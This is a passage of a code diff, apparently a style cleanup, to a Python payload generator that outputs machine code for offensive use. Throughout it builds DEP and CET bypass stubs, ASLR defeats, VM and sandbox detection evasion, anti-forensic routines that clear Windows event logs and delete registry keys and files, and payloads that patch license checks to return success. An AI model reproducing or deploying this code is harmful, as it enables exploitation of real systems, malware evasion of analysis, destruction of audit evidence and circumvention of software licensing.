             # Information disclosure to defeat ASLR
             return b"\x8d\x05\x00\x00\x00\x00\xc3"  # lea eax, [rip]; ret
-        elif technique == "partial_overwrite":
+        if technique == "partial_overwrite":
             # Partial address overwrite
             return b"\x66\x90" * 4  # Preserve high bytes
-        else:
-            return b"\x90" * 8
+        return b"\x90" * 8
 
     def _generate_dep_bypass(self, **kwargs) -> bytes:
         """Generate DEP bypass payload."""
@@ -1142,7 +1107,7 @@ class AdvancedPayloadGenerator:
             if arch == "x64":
                 # x64 VirtualAlloc approach
                 bypass_code = (
-                    b"\x48\x31\xc9" +                                  # xor rcx, rcx (lpAddress = NULL)
+                    b"\x48\x31\xc9"                                  # xor rcx, rcx (lpAddress = NULL)
                     b"\x48\xba" + size.to_bytes(8, "little") +         # mov rdx, size (dwSize)
                     b"\x41\xb8\x00\x30\x00\x00" +                     # mov r8d, MEM_COMMIT | MEM_RESERVE
                     b"\x41\xb9\x40\x00\x00\x00" +                     # mov r9d, PAGE_EXECUTE_READWRITE
@@ -1152,8 +1117,8 @@ class AdvancedPayloadGenerator:
             else:
                 # x86 VirtualAlloc approach
                 bypass_code = (
-                    b"\x6a\x40" +                                      # push PAGE_EXECUTE_READWRITE
-                    b"\x68\x00\x30\x00\x00" +                         # push MEM_COMMIT | MEM_RESERVE
+                    b"\x6a\x40"                                      # push PAGE_EXECUTE_READWRITE
+                    b"\x68\x00\x30\x00\x00"                         # push MEM_COMMIT | MEM_RESERVE
                     b"\x68" + size.to_bytes(4, "little") +             # push size
                     b"\x6a\x00" +                                      # push NULL (lpAddress)
                     b"\xff\x15\x00\x00\x00\x00" +                     # call [VirtualAlloc]
@@ -1239,7 +1204,7 @@ class AdvancedPayloadGenerator:
             if arch == "x64":
                 # x64 CET shadow stack manipulation
                 bypass_code = (
-                    b"\x48\x83\xec\x08" +                              # sub rsp, 8
+                    b"\x48\x83\xec\x08"                              # sub rsp, 8
                     b"\x48\xb8" + target_addr.to_bytes(8, "little") +  # mov rax, target_addr
                     b"\x48\x89\x04\x24" +                              # mov [rsp], rax
                     b"\xf3\x0f\x1e\xfa" +                              # endbr64 (CET end branch)
@@ -1249,7 +1214,7 @@ class AdvancedPayloadGenerator:
             else:
                 # x86 CET handling
                 bypass_code = (
-                    b"\x83\xec\x04" +                                  # sub esp, 4
+                    b"\x83\xec\x04"                                  # sub esp, 4
                     b"\xb8" + target_addr.to_bytes(4, "little") +      # mov eax, target_addr
                     b"\x89\x04\x24" +                                  # mov [esp], eax
                     b"\xf3\x0f\x1e\xfb" +                              # endbr32 (CET end branch)
@@ -1260,13 +1225,13 @@ class AdvancedPayloadGenerator:
             # Use valid indirect branch targets to bypass CET
             if arch == "x64":
                 bypass_code = (
-                    b"\xf3\x0f\x1e\xfa" +                              # endbr64
+                    b"\xf3\x0f\x1e\xfa"                              # endbr64
                     b"\x48\xb8" + target_addr.to_bytes(8, "little") +  # mov rax, target_addr
                     b"\xff\xe0"                                        # jmp rax
                 )
             else:
                 bypass_code = (
-                    b"\xf3\x0f\x1e\xfb" +                              # endbr32
+                    b"\xf3\x0f\x1e\xfb"                              # endbr32
                     b"\xb8" + target_addr.to_bytes(4, "little") +      # mov eax, target_addr
                     b"\xff\xe0"                                        # jmp eax
                 )
@@ -1274,18 +1239,18 @@ class AdvancedPayloadGenerator:
             # ROP-style CET bypass
             if arch == "x64":
                 bypass_code = (
-                    b"\x48\x89\xe0" +                                  # mov rax, rsp
-                    b"\x48\x83\xc0\x08" +                              # add rax, 8
-                    b"\x48\x89\x04\x24" +                              # mov [rsp], rax
-                    b"\xf3\x0f\x1e\xfa" +                              # endbr64
+                    b"\x48\x89\xe0"                                  # mov rax, rsp
+                    b"\x48\x83\xc0\x08"                              # add rax, 8
+                    b"\x48\x89\x04\x24"                              # mov [rsp], rax
+                    b"\xf3\x0f\x1e\xfa"                              # endbr64
                     b"\xc3"                                            # ret
                 )
             else:
                 bypass_code = (
-                    b"\x89\xe0" +                                      # mov eax, esp
-                    b"\x83\xc0\x04" +                                  # add eax, 4
-                    b"\x89\x04\x24" +                                  # mov [esp], eax
-                    b"\xf3\x0f\x1e\xfb" +                              # endbr32
+                    b"\x89\xe0"                                      # mov eax, esp
+                    b"\x83\xc0\x04"                                  # add eax, 4
+                    b"\x89\x04\x24"                                  # mov [esp], eax
+                    b"\xf3\x0f\x1e\xfb"                              # endbr32
                     b"\xc3"                                            # ret
                 )
         else:
@@ -1306,20 +1271,20 @@ class AdvancedPayloadGenerator:
             # VMware detection evasion
             if arch == "x64":
                 payload += (
-                    b"\x48\xb8\x56\x4d\x58\x68\x00\x00\x00\x00" +  # mov rax, 'VMXh'
-                    b"\x48\x31\xd2" +                               # xor rdx, rdx
-                    b"\x0f\x01\xc1" +                               # vmcall (VMware instruction)
-                    b"\x48\x83\xf8\x56" +                           # cmp rax, 'V'
-                    b"\x74\x05" +                                   # je vm_detected
+                    b"\x48\xb8\x56\x4d\x58\x68\x00\x00\x00\x00"  # mov rax, 'VMXh'
+                    b"\x48\x31\xd2"                               # xor rdx, rdx
+                    b"\x0f\x01\xc1"                               # vmcall (VMware instruction)
+                    b"\x48\x83\xf8\x56"                           # cmp rax, 'V'
+                    b"\x74\x05"                                   # je vm_detected
                     b"\xeb\x10"                                     # jmp continue
                 )
             else:
                 payload += (
-                    b"\xb8\x56\x4d\x58\x68" +                       # mov eax, 'VMXh'
-                    b"\x31\xd2" +                                   # xor edx, edx
-                    b"\x0f\x01\xc1" +                               # vmcall
-                    b"\x83\xf8\x56" +                               # cmp eax, 'V'
-                    b"\x74\x05" +                                   # je vm_detected
+                    b"\xb8\x56\x4d\x58\x68"                       # mov eax, 'VMXh'
+                    b"\x31\xd2"                                   # xor edx, edx
+                    b"\x0f\x01\xc1"                               # vmcall
+                    b"\x83\xf8\x56"                               # cmp eax, 'V'
+                    b"\x74\x05"                                   # je vm_detected
                     b"\xeb\x10"                                     # jmp continue
                 )
 
@@ -1327,29 +1292,29 @@ class AdvancedPayloadGenerator:
             # VirtualBox detection evasion
             if arch == "x64":
                 payload += (
-                    b"\x48\xb8\x56\x42\x6f\x78\x00\x00\x00\x00" +  # mov rax, 'VBox'
-                    b"\x0f\xa2" +                                   # cpuid
-                    b"\x48\x81\xfb\x56\x42\x6f\x78" +               # cmp rbx, 'VBox'
-                    b"\x74\x05" +                                   # je vm_detected
+                    b"\x48\xb8\x56\x42\x6f\x78\x00\x00\x00\x00"  # mov rax, 'VBox'
+                    b"\x0f\xa2"                                   # cpuid
+                    b"\x48\x81\xfb\x56\x42\x6f\x78"               # cmp rbx, 'VBox'
+                    b"\x74\x05"                                   # je vm_detected
                     b"\xeb\x08"                                     # jmp continue
                 )
             else:
                 payload += (
-                    b"\xb8\x01\x00\x00\x00" +                       # mov eax, 1
-                    b"\x0f\xa2" +                                   # cpuid
-                    b"\x81\xfb\x56\x42\x6f\x78" +                   # cmp ebx, 'VBox'
-                    b"\x74\x05" +                                   # je vm_detected
+                    b"\xb8\x01\x00\x00\x00"                       # mov eax, 1
+                    b"\x0f\xa2"                                   # cpuid
+                    b"\x81\xfb\x56\x42\x6f\x78"                   # cmp ebx, 'VBox'
+                    b"\x74\x05"                                   # je vm_detected
                     b"\xeb\x08"                                     # jmp continue
                 )
 
         if "qemu" in vm_types:
             # QEMU detection evasion
             payload += (
-                b"\x66\xba\x78\x56" +                               # mov dx, 0x5678 (QEMU port)
-                b"\xb0\x00" +                                       # mov al, 0
-                b"\xee" +                                           # out dx, al
-                b"\x3c\x42" +                                       # cmp al, 'B' (QEMU signature)
-                b"\x74\x02" +                                       # je vm_detected
+                b"\x66\xba\x78\x56"                               # mov dx, 0x5678 (QEMU port)
+                b"\xb0\x00"                                       # mov al, 0
+                b"\xee"                                           # out dx, al
+                b"\x3c\x42"                                       # cmp al, 'B' (QEMU signature)
+                b"\x74\x02"                                       # je vm_detected
                 b"\xeb\x05"                                         # jmp continue
             )
 
@@ -1357,26 +1322,26 @@ class AdvancedPayloadGenerator:
             # Advanced timing-based detection
             if arch == "x64":
                 payload += (
-                    b"\x0f\x31" +                                   # rdtsc
-                    b"\x48\x89\xc3" +                               # mov rbx, rax
-                    b"\x48\xc7\xc0\xe8\x03\x00\x00" +               # mov rax, 1000
-                    b"\x48\x29\xc0" +                               # sub rax, rax (delay loop)
-                    b"\x0f\x31" +                                   # rdtsc
-                    b"\x48\x29\xd8" +                               # sub rax, rbx
-                    b"\x48\x3d\x00\x27\x00\x00" +                   # cmp rax, 10000
-                    b"\x7c\x02" +                                   # jl vm_detected
+                    b"\x0f\x31"                                   # rdtsc
+                    b"\x48\x89\xc3"                               # mov rbx, rax
+                    b"\x48\xc7\xc0\xe8\x03\x00\x00"               # mov rax, 1000
+                    b"\x48\x29\xc0"                               # sub rax, rax (delay loop)
+                    b"\x0f\x31"                                   # rdtsc
+                    b"\x48\x29\xd8"                               # sub rax, rbx
+                    b"\x48\x3d\x00\x27\x00\x00"                   # cmp rax, 10000
+                    b"\x7c\x02"                                   # jl vm_detected
                     b"\xeb\x03"                                     # jmp normal_execution
                 )
             else:
                 payload += (
-                    b"\x0f\x31" +                                   # rdtsc
-                    b"\x89\xc3" +                                   # mov ebx, eax
-                    b"\xb8\xe8\x03\x00\x00" +                       # mov eax, 1000
-                    b"\x29\xc0" +                                   # sub eax, eax
-                    b"\x0f\x31" +                                   # rdtsc
-                    b"\x29\xd8" +                                   # sub eax, ebx
-                    b"\x3d\x00\x27\x00\x00" +                       # cmp eax, 10000
-                    b"\x7c\x02" +                                   # jl vm_detected
+                    b"\x0f\x31"                                   # rdtsc
+                    b"\x89\xc3"                                   # mov ebx, eax
+                    b"\xb8\xe8\x03\x00\x00"                       # mov eax, 1000
+                    b"\x29\xc0"                                   # sub eax, eax
+                    b"\x0f\x31"                                   # rdtsc
+                    b"\x29\xd8"                                   # sub eax, ebx
+                    b"\x3d\x00\x27\x00\x00"                       # cmp eax, 10000
+                    b"\x7c\x02"                                   # jl vm_detected
                     b"\xeb\x03"                                     # jmp normal_execution
                 )
 
@@ -1398,8 +1363,8 @@ class AdvancedPayloadGenerator:
             # Timing-based sandbox detection
             if arch == "x64":
                 payload += (
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [GetTickCount]
-                    b"\x48\x89\xc3" +                           # mov rbx, rax (save initial tick)
+                    b"\xff\x15\x00\x00\x00\x00"               # call [GetTickCount]
+                    b"\x48\x89\xc3"                           # mov rbx, rax (save initial tick)
                     b"\x48\xc7\xc1" + sleep_duration.to_bytes(4, "little") + b"\x00\x00\x00\x00" +  # mov rcx, sleep_duration
                     b"\xff\x15\x00\x00\x00\x00" +               # call [Sleep]
                     b"\xff\x15\x00\x00\x00\x00" +               # call [GetTickCount]
@@ -1410,8 +1375,8 @@ class AdvancedPayloadGenerator:
                 )
             else:
                 payload += (
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [GetTickCount]
-                    b"\x89\xc3" +                               # mov ebx, eax
+                    b"\xff\x15\x00\x00\x00\x00"               # call [GetTickCount]
+                    b"\x89\xc3"                               # mov ebx, eax
                     b"\x68" + sleep_duration.to_bytes(4, "little") +  # push sleep_duration
                     b"\xff\x15\x00\x00\x00\x00" +               # call [Sleep]
                     b"\xff\x15\x00\x00\x00\x00" +               # call [GetTickCount]
@@ -1425,67 +1390,67 @@ class AdvancedPayloadGenerator:
             # Check for user interaction (mouse movement)
             if arch == "x64":
                 payload += (
-                    b"\x48\x83\xec\x08" +                       # sub rsp, 8 (allocate POINT structure)
-                    b"\x48\x89\xe1" +                           # mov rcx, rsp
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [GetCursorPos]
-                    b"\x48\x8b\x04\x24" +                       # mov rax, [rsp] (initial position)
-                    b"\x48\x89\xc3" +                           # mov rbx, rax
-                    b"\x48\xc7\xc1\xf4\x01\x00\x00" +           # mov rcx, 500 (sleep 500ms)
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [Sleep]
-                    b"\x48\x89\xe1" +                           # mov rcx, rsp
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [GetCursorPos]
-                    b"\x48\x8b\x04\x24" +                       # mov rax, [rsp] (new position)
-                    b"\x48\x39\xd8" +                           # cmp rax, rbx
-                    b"\x74\x05" +                               # je sandbox_detected (no movement)
-                    b"\x48\x83\xc4\x08" +                       # add rsp, 8
+                    b"\x48\x83\xec\x08"                       # sub rsp, 8 (allocate POINT structure)
+                    b"\x48\x89\xe1"                           # mov rcx, rsp
+                    b"\xff\x15\x00\x00\x00\x00"               # call [GetCursorPos]
+                    b"\x48\x8b\x04\x24"                       # mov rax, [rsp] (initial position)
+                    b"\x48\x89\xc3"                           # mov rbx, rax
+                    b"\x48\xc7\xc1\xf4\x01\x00\x00"           # mov rcx, 500 (sleep 500ms)
+                    b"\xff\x15\x00\x00\x00\x00"               # call [Sleep]
+                    b"\x48\x89\xe1"                           # mov rcx, rsp
+                    b"\xff\x15\x00\x00\x00\x00"               # call [GetCursorPos]
+                    b"\x48\x8b\x04\x24"                       # mov rax, [rsp] (new position)
+                    b"\x48\x39\xd8"                           # cmp rax, rbx
+                    b"\x74\x05"                               # je sandbox_detected (no movement)
+                    b"\x48\x83\xc4\x08"                       # add rsp, 8
                     b"\xeb\x10"                                 # jmp normal_execution
                 )
             else:
                 payload += (
-                    b"\x83\xec\x08" +                           # sub esp, 8
-                    b"\x89\xe0" +                               # mov eax, esp
-                    b"\x50" +                                   # push eax
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [GetCursorPos]
-                    b"\x8b\x1c\x24" +                           # mov ebx, [esp] (initial position)
-                    b"\x68\xf4\x01\x00\x00" +                   # push 500
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [Sleep]
-                    b"\x89\xe0" +                               # mov eax, esp
-                    b"\x50" +                                   # push eax
-                    b"\xff\x15\x00\x00\x00\x00" +               # call [GetCursorPos]
-                    b"\x8b\x04\x24" +                           # mov eax, [esp]
-                    b"\x39\xd8" +                               # cmp eax, ebx
-                    b"\x74\x05" +                               # je sandbox_detected
-                    b"\x83\xc4\x08" +                           # add esp, 8
+                    b"\x83\xec\x08"                           # sub esp, 8
+                    b"\x89\xe0"                               # mov eax, esp
+                    b"\x50"                                   # push eax
+                    b"\xff\x15\x00\x00\x00\x00"               # call [GetCursorPos]
+                    b"\x8b\x1c\x24"                           # mov ebx, [esp] (initial position)
+                    b"\x68\xf4\x01\x00\x00"                   # push 500
+                    b"\xff\x15\x00\x00\x00\x00"               # call [Sleep]
+                    b"\x89\xe0"                               # mov eax, esp
+                    b"\x50"                                   # push eax
+                    b"\xff\x15\x00\x00\x00\x00"               # call [GetCursorPos]
+                    b"\x8b\x04\x24"                           # mov eax, [esp]
+                    b"\x39\xd8"                               # cmp eax, ebx
+                    b"\x74\x05"                               # je sandbox_detected
+                    b"\x83\xc4\x08"                           # add esp, 8
                     b"\xeb\x10"                                 # jmp normal_execution
                 )
 
         if "artifacts" in detection_methods:
             # Check for sandbox artifacts
             payload += (
-                b"\x68\x2e\x65\x78\x65" +                       # push '.exe' (check for known sandbox files)
-                b"\x68\x73\x62\x78\x00" +                       # push 'sbx\0'
-                b"\x89\xe0" +                                   # mov eax, esp
-                b"\x50" +                                       # push eax
-                b"\xff\x15\x00\x00\x00\x00" +                   # call [GetFileAttributes]
-                b"\x83\xf8\xff" +                               # cmp eax, INVALID_FILE_ATTRIBUTES
-                b"\x75\x05" +                                   # jne sandbox_detected (file exists)
-                b"\x83\xc4\x08" +                               # add esp, 8
+                b"\x68\x2e\x65\x78\x65"                       # push '.exe' (check for known sandbox files)
+                b"\x68\x73\x62\x78\x00"                       # push 'sbx\0'
+                b"\x89\xe0"                                   # mov eax, esp
+                b"\x50"                                       # push eax
+                b"\xff\x15\x00\x00\x00\x00"                   # call [GetFileAttributes]
+                b"\x83\xf8\xff"                               # cmp eax, INVALID_FILE_ATTRIBUTES
+                b"\x75\x05"                                   # jne sandbox_detected (file exists)
+                b"\x83\xc4\x08"                               # add esp, 8
                 b"\xeb\x05"                                     # jmp normal_execution
             )
 
         if evasion_level == "advanced":
             # Advanced evasion techniques
             payload += (
-                b"\x0f\x31" +                                   # rdtsc (timing check)
-                b"\x89\xc3" +                                   # mov ebx, eax
-                b"\x31\xc0" +                                   # xor eax, eax
-                b"\xff\xc0" +                                   # inc eax (delay loop)
-                b"\x83\xf8\x64" +                               # cmp eax, 100
-                b"\x7c\xfb" +                                   # jl loop
-                b"\x0f\x31" +                                   # rdtsc
-                b"\x29\xd8" +                                   # sub eax, ebx
-                b"\x3d\x00\x10\x00\x00" +                       # cmp eax, 4096
-                b"\x7c\x02" +                                   # jl sandbox_detected
+                b"\x0f\x31"                                   # rdtsc (timing check)
+                b"\x89\xc3"                                   # mov ebx, eax
+                b"\x31\xc0"                                   # xor eax, eax
+                b"\xff\xc0"                                   # inc eax (delay loop)
+                b"\x83\xf8\x64"                               # cmp eax, 100
+                b"\x7c\xfb"                                   # jl loop
+                b"\x0f\x31"                                   # rdtsc
+                b"\x29\xd8"                                   # sub eax, ebx
+                b"\x3d\x00\x10\x00\x00"                       # cmp eax, 4096
+                b"\x7c\x02"                                   # jl sandbox_detected
                 b"\xeb\x05"                                     # jmp normal_execution
             )
 
@@ -1527,7 +1492,7 @@ class AdvancedPayloadGenerator:
             # Clear sensitive memory regions
             if arch == "x64":
                 payload += (
-                    b"\x48\x31\xc9" +                               # xor rcx, rcx (start address)
+                    b"\x48\x31\xc9"                               # xor rcx, rcx (start address)
                     b"\x48\xba" + clear_size.to_bytes(8, "little") +  # mov rdx, clear_size
                     b"\x41\xb8\x00\x00\x00\x00" +                   # mov r8d, 0 (value)
                     b"\xff\x15\x00\x00\x00\x00" +                   # call [RtlSecureZeroMemory]
@@ -1536,8 +1501,8 @@ class AdvancedPayloadGenerator:
                 )
             else:
                 payload += (
-                    b"\x31\xc0" +                                   # xor eax, eax
-                    b"\x50" +                                       # push eax (start address)
+                    b"\x31\xc0"                                   # xor eax, eax
+                    b"\x50"                                       # push eax (start address)
                     b"\x68" + clear_size.to_bytes(4, "little") +     # push clear_size
                     b"\x6a\x00" +                                   # push 0 (value)
                     b"\xff\x15\x00\x00\x00\x00" +                   # call [RtlSecureZeroMemory]
@@ -1549,20 +1514,20 @@ class AdvancedPayloadGenerator:
             # Remove registry artifacts
             if arch == "x64":
                 payload += (
-                    b"\x48\xb9\x80\x00\x00\x00\x00\x00\x00\x00" +   # mov rcx, HKEY_LOCAL_MACHINE
-                    b"\x48\xba\x00\x00\x00\x00\x00\x00\x00\x00" +   # mov rdx, subkey_ptr
-                    b"\xff\x15\x00\x00\x00\x00" +                   # call [RegDeleteKey]
-                    b"\x48\xb9\x80\x00\x00\x01\x00\x00\x00\x00" +   # mov rcx, HKEY_CURRENT_USER
-                    b"\x48\xba\x00\x00\x00\x00\x00\x00\x00\x00" +   # mov rdx, subkey_ptr
+                    b"\x48\xb9\x80\x00\x00\x00\x00\x00\x00\x00"   # mov rcx, HKEY_LOCAL_MACHINE
+                    b"\x48\xba\x00\x00\x00\x00\x00\x00\x00\x00"   # mov rdx, subkey_ptr
+                    b"\xff\x15\x00\x00\x00\x00"                   # call [RegDeleteKey]
+                    b"\x48\xb9\x80\x00\x00\x01\x00\x00\x00\x00"   # mov rcx, HKEY_CURRENT_USER
+                    b"\x48\xba\x00\x00\x00\x00\x00\x00\x00\x00"   # mov rdx, subkey_ptr
                     b"\xff\x15\x00\x00\x00\x00"                     # call [RegDeleteKey]
                 )
             else:
                 payload += (
-                    b"\x68\x80\x00\x00\x00" +                       # push HKEY_LOCAL_MACHINE
-                    b"\x68\x00\x00\x00\x00" +                       # push subkey_ptr
-                    b"\xff\x15\x00\x00\x00\x00" +                   # call [RegDeleteKey]
-                    b"\x68\x80\x00\x00\x01" +                       # push HKEY_CURRENT_USER
-                    b"\x68\x00\x00\x00\x00" +                       # push subkey_ptr
+                    b"\x68\x80\x00\x00\x00"                       # push HKEY_LOCAL_MACHINE
+                    b"\x68\x00\x00\x00\x00"                       # push subkey_ptr
+                    b"\xff\x15\x00\x00\x00\x00"                   # call [RegDeleteKey]
+                    b"\x68\x80\x00\x00\x01"                       # push HKEY_CURRENT_USER
+                    b"\x68\x00\x00\x00\x00"                       # push subkey_ptr
                     b"\xff\x15\x00\x00\x00\x00"                     # call [RegDeleteKey]
                 )
 
@@ -1570,37 +1535,37 @@ class AdvancedPayloadGenerator:
             # Clear event logs
             if arch == "x64":
                 payload += (
-                    b"\x48\xb9\x00\x00\x00\x00\x00\x00\x00\x00" +   # mov rcx, "Security"
-                    b"\xff\x15\x00\x00\x00\x00" +                   # call [OpenEventLog]
-                    b"\x48\x89\xc1" +                               # mov rcx, rax (log handle)
-                    b"\x48\x31\xd2" +                               # xor rdx, rdx
-                    b"\x48\x31\xc0" +                               # xor rax, rax
-                    b"\xff\x15\x00\x00\x00\x00" +                   # call [ClearEventLog]
-                    b"\x48\xb9\x00\x00\x00\x00\x00\x00\x00\x00" +   # mov rcx, "Application"
+                    b"\x48\xb9\x00\x00\x00\x00\x00\x00\x00\x00"   # mov rcx, "Security"
+                    b"\xff\x15\x00\x00\x00\x00"                   # call [OpenEventLog]
+                    b"\x48\x89\xc1"                               # mov rcx, rax (log handle)
+                    b"\x48\x31\xd2"                               # xor rdx, rdx
+                    b"\x48\x31\xc0"                               # xor rax, rax
+                    b"\xff\x15\x00\x00\x00\x00"                   # call [ClearEventLog]
+                    b"\x48\xb9\x00\x00\x00\x00\x00\x00\x00\x00"   # mov rcx, "Application"
                     b"\xff\x15\x00\x00\x00\x00"                     # call [OpenEventLog]
                 )
             else:
                 payload += (
-                    b"\x68\x00\x00\x00\x00" +                       # push "Security"
-                    b"\x6a\x00" +                                   # push NULL (server)
-                    b"\xff\x15\x00\x00\x00\x00" +                   # call [OpenEventLog]
-                    b"\x50" +                                       # push eax (log handle)
-                    b"\x6a\x00" +                                   # push NULL
-                    b"\xff\x15\x00\x00\x00\x00" +                   # call [ClearEventLog]
-                    b"\x68\x00\x00\x00\x00" +                       # push "Application"
-                    b"\x6a\x00" +                                   # push NULL
+                    b"\x68\x00\x00\x00\x00"                       # push "Security"
+                    b"\x6a\x00"                                   # push NULL (server)
+                    b"\xff\x15\x00\x00\x00\x00"                   # call [OpenEventLog]
+                    b"\x50"                                       # push eax (log handle)
+                    b"\x6a\x00"                                   # push NULL
+                    b"\xff\x15\x00\x00\x00\x00"                   # call [ClearEventLog]
+                    b"\x68\x00\x00\x00\x00"                       # push "Application"
+                    b"\x6a\x00"                                   # push NULL
                     b"\xff\x15\x00\x00\x00\x00"                     # call [OpenEventLog]
                 )
 
         if "artifact_removal" in techniques and "files" in target_areas:
             # Remove temporary files and traces
             payload += (
-                b"\x68\x00\x00\x00\x00" +                           # push file_path_ptr
-                b"\xff\x15\x00\x00\x00\x00" +                       # call [DeleteFile]
-                b"\x68\x00\x00\x00\x00" +                           # push temp_dir_ptr
-                b"\xff\x15\x00\x00\x00\x00" +                       # call [RemoveDirectory]
-                b"\x68\x07\x00\x00\x00" +                           # push FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
-                b"\x68\x00\x00\x00\x00" +                           # push "*.*"
+                b"\x68\x00\x00\x00\x00"                           # push file_path_ptr
+                b"\xff\x15\x00\x00\x00\x00"                       # call [DeleteFile]
+                b"\x68\x00\x00\x00\x00"                           # push temp_dir_ptr
+                b"\xff\x15\x00\x00\x00\x00"                       # call [RemoveDirectory]
+                b"\x68\x07\x00\x00\x00"                           # push FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
+                b"\x68\x00\x00\x00\x00"                           # push "*.*"
                 b"\xff\x15\x00\x00\x00\x00"                         # call [FindFirstFile]
             )
 
@@ -1621,9 +1586,8 @@ class AdvancedPayloadGenerator:
 
         return payload
 
-    def generate_license_bypass_payload(self, strategy: Dict[str, Any]) -> Optional[bytes]:
-        """
-        Generate advanced license bypass payloads.
+    def generate_license_bypass_payload(self, strategy: dict[str, Any]) -> bytes | None:
+        """Generate advanced license bypass payloads.
 
         Creates specialized machine code payloads designed to bypass license protection
         mechanisms based on the provided exploitation strategy. Selects the appropriate
@@ -1635,6 +1599,7 @@ class AdvancedPayloadGenerator:
 
         Returns:
             bytes: Assembled machine code payload ready for injection or patching
+
         """
         self.logger.info(f"Generating license bypass payload for strategy: {strategy.get('strategy', 'generic_bypass')}")
 
@@ -1643,12 +1608,12 @@ class AdvancedPayloadGenerator:
             "memory_manipulation": self._memory_manipulation_payload,
             "license_bypass": self._license_validation_bypass,
             "cryptographic_bypass": self._crypto_bypass_payload,
-            "generic_bypass": self._generic_bypass_payload
+            "generic_bypass": self._generic_bypass_payload,
         }
 
         generator = payload_generators.get(
             strategy.get("strategy", "generic_bypass"),
-            self._generic_bypass_payload
+            self._generic_bypass_payload,
         )
 
         self.logger.debug("Selected generator: %s", generator.__name__)
@@ -1660,9 +1625,8 @@ class AdvancedPayloadGenerator:
             self.logger.error("Failed to generate payload")
         return payload_bytes
 
-    def _function_hijack_payload(self, strategy: Dict[str, Any]) -> Optional[bytes]:
-        """
-        Generate payload to hijack critical functions.
+    def _function_hijack_payload(self, strategy: dict[str, Any]) -> bytes | None:
+        """Generate payload to hijack critical functions.
 
         Creates x86-64 assembly code that replaces the functionality of targeted functions,
         typically forcing them to return success values regardless of input parameters.
@@ -1673,6 +1637,7 @@ class AdvancedPayloadGenerator:
 
         Returns:
             bytes: Assembled machine code ready for injection at the target function address
+
         """
         self.logger.debug("Generating function hijack payload for strategy: %s", strategy)
 
@@ -1683,9 +1648,8 @@ class AdvancedPayloadGenerator:
 
         return self._assemble_x86_64(hijack_template)
 
-    def _memory_manipulation_payload(self, strategy: Dict[str, Any]) -> Optional[bytes]:
-        """
-        Generate memory manipulation payload.
+    def _memory_manipulation_payload(self, strategy: dict[str, Any]) -> bytes | None:
+        """Generate memory manipulation payload.
 
         Creates specialized machine code for modifying memory regions containing
         license validation logic or protected data. Uses techniques like NOP slides
@@ -1696,6 +1660,7 @@ class AdvancedPayloadGenerator:
 
         Returns:
             bytes: Assembled machine code for memory manipulation
+
         """
         self.logger.debug("Generating memory manipulation payload for strategy: %s", strategy)
 
@@ -1711,15 +1676,14 @@ class AdvancedPayloadGenerator:
             push 1           ; Push success value to stack
             pop rax          ; Pop into return register
             ret              ; Return from function
-            """
+            """,
         ]
 
         template = random.choice(manipulation_templates)  # noqa: S311
         return self._assemble_x86_64(template)
 
-    def _license_validation_bypass(self, strategy: Dict[str, Any]) -> Optional[bytes]:
-        """
-        Generate sophisticated license validation bypass payload.
+    def _license_validation_bypass(self, strategy: dict[str, Any]) -> bytes | None:
+        """Generate sophisticated license validation bypass payload.
 
         Creates specialized machine code specifically designed to bypass license
         validation routines. Uses multiple techniques including register manipulation,
@@ -1731,6 +1695,7 @@ class AdvancedPayloadGenerator:
 
         Returns:
             bytes: Assembled machine code payload optimized for license validation bypass
+
         """
         self.logger.debug("Generating license validation bypass payload for strategy: %s", strategy)
 
@@ -1748,15 +1713,14 @@ class AdvancedPayloadGenerator:
             push 1           ; Push success value to stack
             pop rax          ; Pop into return register
             ret              ; Return from function
-            """
+            """,
         ]
 
         template = random.choice(bypass_techniques)  # noqa: S311
         return self._assemble_x86_64(template)
 
-    def _crypto_bypass_payload(self, strategy: Dict[str, Any]) -> Optional[bytes]:
-        """
-        Generate advanced cryptographic bypass payload.
+    def _crypto_bypass_payload(self, strategy: dict[str, Any]) -> bytes | None:
+        """Generate advanced cryptographic bypass payload.
 
         Creates machine code designed to bypass cryptographic verification routines
         by returning hardcoded "valid" keys or hash values. Targets cryptographic
@@ -1767,6 +1731,7 @@ class AdvancedPayloadGenerator:
 
         Returns:
             bytes: Assembled machine code payload for cryptographic validation bypass
+
         """
         self.logger.debug("Generating crypto bypass payload for strategy: %s", strategy)
 
@@ -1781,15 +1746,14 @@ class AdvancedPayloadGenerator:
             push 0x1                     ; Push constant "valid" value
             pop rax
             ret
-            """
+            """,
         ]
 
         template = random.choice(crypto_bypass_techniques)  # noqa: S311
         return self._assemble_x86_64(template)
 
-    def _generic_bypass_payload(self, strategy: Dict[str, Any]) -> Optional[bytes]:
-        """
-        Fallback generic bypass payload.
+    def _generic_bypass_payload(self, strategy: dict[str, Any]) -> bytes | None:
+        """Fallback generic bypass payload.
 
         Creates a general-purpose bypass payload when specific vulnerability details
         are insufficient for a targeted approach. Implements common bypass techniques
@@ -1800,6 +1764,7 @@ class AdvancedPayloadGenerator:
 
         Returns:
             bytes: Assembled machine code payload with generic bypass techniques
+
         """
         self.logger.debug("Generating generic bypass payload for strategy: %s", strategy)
 
@@ -1812,15 +1777,14 @@ class AdvancedPayloadGenerator:
             xor rax, rax    ; Zero register
             inc rax         ; Increment to 1
             ret             ; Return from function
-            """
+            """,
         ]
 
         template = random.choice(generic_techniques)  # noqa: S311
         return self._assemble_x86_64(template)
 
-    def _assemble_x86_64(self, assembly_code: str) -> Optional[bytes]:
-        """
-        Assemble x86-64 assembly to machine code.
+    def _assemble_x86_64(self, assembly_code: str) -> bytes | None:
+        """Assemble x86-64 assembly to machine code.
 
         Converts human-readable x86-64 assembly language instructions into binary
         machine code that can be directly executed by the processor. Uses the Keystone
@@ -1832,6 +1796,7 @@ class AdvancedPayloadGenerator:
         Returns:
             bytes: Assembled machine code ready for injection or patching if successful,
                    None if assembly fails
+
         """
         if not assembly_code or not assembly_code.strip():
             self.logger.error("Empty assembly code provided to _assemble_x86_64")
@@ -1863,9 +1828,8 @@ class AdvancedPayloadGenerator:
 
 
 # Convenience functions
-def generate_payload(payload_type: str, **kwargs) -> Optional[bytes]:  # pylint: disable=unused-argument
-    """
-    Generate a payload using the default generator.
